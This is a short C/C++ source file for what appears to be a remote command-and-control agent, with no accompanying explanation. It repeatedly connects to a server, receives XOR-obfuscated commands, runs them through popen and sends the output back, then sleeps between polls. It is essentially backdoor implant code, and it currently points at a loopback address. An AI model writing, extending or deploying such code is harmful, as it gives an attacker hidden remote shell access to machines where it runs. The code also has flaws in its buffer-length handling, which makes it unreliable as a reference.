#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <poll.h>
#include <arpa/inet.h>
#define BUFSIZE 0x10000

typedef int socket_fd;

struct Client
{
    char* buf;
    
    char* key = "\x16\x1c\xa8\xe1\x14\xcd\xed\x99\xf5\xdd\xae\xf6\xeb";
    int keylen = 0;

    socket_fd Client;
    struct sockaddr_in server_info;

    void Init(char* server_ip, int port)
    {
        buf = (char*)malloc(BUFSIZE);
        keylen = strlen(key);

        Client = socket(AF_INET, SOCK_STREAM, 0);

        memset(&server_info, '\x00', sizeof(server_info));
        server_info.sin_family = AF_INET;
        server_info.sin_port = htons(port);
        server_info.sin_addr.s_addr = inet_addr(server_ip);

        printf("\ninit connection to %s:%d\n", server_ip, port);
    }

    void Connect()
    {
        connect(Client, (struct sockaddr *)&server_info, sizeof(server_info));
    }

    void Encrypt()
    {
        int buf_len = strlen(buf);
        for(int i = 0; i < buf_len; i++)
            buf[i] = buf[i] ^ (key[i % keylen]);
    }

    void Decrypt()
    {
        int buf_len = strlen(buf);
        for(int i = 0; i < buf_len; i++)
        {
            buf[i] = buf[i] ^ (key[i % keylen]);
            printf("%02x ^ %02x\n", (unsigned char)buf[i], (unsigned char)(key[i % keylen]));
        }
    }

    void Send(char* text)
    {
        printf("Sending\n%s\n", text);
        strcpy(buf, text);
        Encrypt();

        send(Client, buf, strlen(buf), 0);
    }

    void Recv(char* text)
    {
        int recvlen = recv(Client, buf, BUFSIZE-1, 0);
        Decrypt();
        buf[recvlen] = '\0';
        printf("Recving%s\n", buf);

        strcpy(text, buf);
    }

    void Close()
    {
        printf("Closing connection\n");
        close(Client);
        free(buf);
    }
};

bool isReadAble(FILE* fp)
{
    struct pollfd pfd;
    pfd.fd = fileno(fp);
    pfd.events = POLLIN;
    int ret = poll(&pfd, 1, 1000);
    return (pfd.revents & POLLIN);
}

int main(int argc, char* argv[])
{
    Client client;
    char* server_ip = "127.0.0.1";
    int port = atoi(argv[1]);

    char* response = (char*)malloc(BUFSIZE);
    char* recv_cmd = (char*)malloc(BUFSIZE);

    FILE *fp;

    while(true)
    {
        client.Init(server_ip, port);

        client.Connect();
        client.Recv(recv_cmd);

        if (strcmp(recv_cmd, "nothing to do"))
        {
            fp = popen(recv_cmd, "r");

            if (isReadAble(fp))
            {
                int read_len = fread(response, 1, BUFSIZE, fp);
                response[read_len] = '\x00';
            }
            else
                strcpy(response, "command execute failed");

            client.Send(response);

            pclose(fp);
            continue;
        }

        client.Close();
        sleep(60);
    }

    return 0;
}


